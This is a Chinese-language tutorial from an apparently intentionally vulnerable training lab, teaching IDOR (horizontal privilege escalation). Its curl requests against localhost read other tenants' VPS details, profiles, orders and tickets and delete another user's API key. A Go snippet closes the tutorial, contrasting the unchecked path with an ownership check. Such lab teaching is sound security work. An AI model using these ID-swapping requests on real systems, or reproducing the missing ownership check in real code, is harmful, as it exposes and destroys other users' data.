# 教程 02: 水平越权 (IDOR)

## 概念

**水平越权 (Insecure Direct Object Reference, IDOR)** 是指攻击者可以通过修改资源标识符（如 ID），访问其他用户拥有的资源。

**难度**: ★☆☆ (入门)

## 漏洞列表

### H-01: 查看他人 VPS 详情

**目标**: 使用 Acme Corp 的用户，查看 Globex Inc 的 VPS 信息。

**步骤**:
1. 使用 `acme_ops` / `pass123` 登录
2. 打开浏览器开发者工具 → Network 面板
3. 访问 VPS 列表，找到一个 VPS（假设 ID 为 1）
4. 捕获 `GET /api/v1/vps/1` 请求
5. 将请求复制为 cURL，修改 ID 为 4（Globex 的 VPS）
6. 发送修改后的请求

```bash
curl http://localhost:8080/api/v1/vps/4 \
  -H "Authorization: Bearer <your-token>"
```

**预期结果**: 成功获取到 Globex 的 VPS 详情。

**原理**: 后端的 `GetDetail` 方法在漏洞模式下没有检查 VPS 的所有权或企业归属。

### H-02: 查看他人个人信息

```bash
curl http://localhost:8080/api/v1/users/8 \
  -H "Authorization: Bearer <your-token>"
```

将用户 ID 修改为其他用户的 ID，即可查看他人个人资料。

### H-03: 查看他人订单

```bash
curl http://localhost:8080/api/v1/orders/3 \
  -H "Authorization: Bearer <your-token>"
```

订单属于其他企业或个人，但你可以查看。

### H-04: 查看/回复他人工单

查看:
```bash
curl http://localhost:8080/api/v1/tickets/1 \
  -H "Authorization: Bearer <your-token>"
```

回复:
```bash
curl -X POST http://localhost:8080/api/v1/tickets/1/reply \
  -H "Authorization: Bearer <your-token>" \
  -H "Content-Type: application/json" \
  -d '{"content": "This is a test reply"}'
```

### H-05: 删除他人 API Key

```bash
curl -X DELETE http://localhost:8080/api/v1/apikeys/2 \
  -H "Authorization: Bearer <your-token>"
```

## 修复方案

在安全模式下，后端会对每个资源请求增加所有权/归属校验：

```go
// Secure mode check
if !vuln.IsSecureMode() {
    return vps, nil // Vulnerable: no check
}
// Secure: verify ownership
if vps.OwnerID != user.ID && vps.CompanyID != user.CompanyID {
    return nil, ErrUnauthorized
}
```

## 下一步

→ [教程 03: 垂直越权](03-vertical-escalation.md)
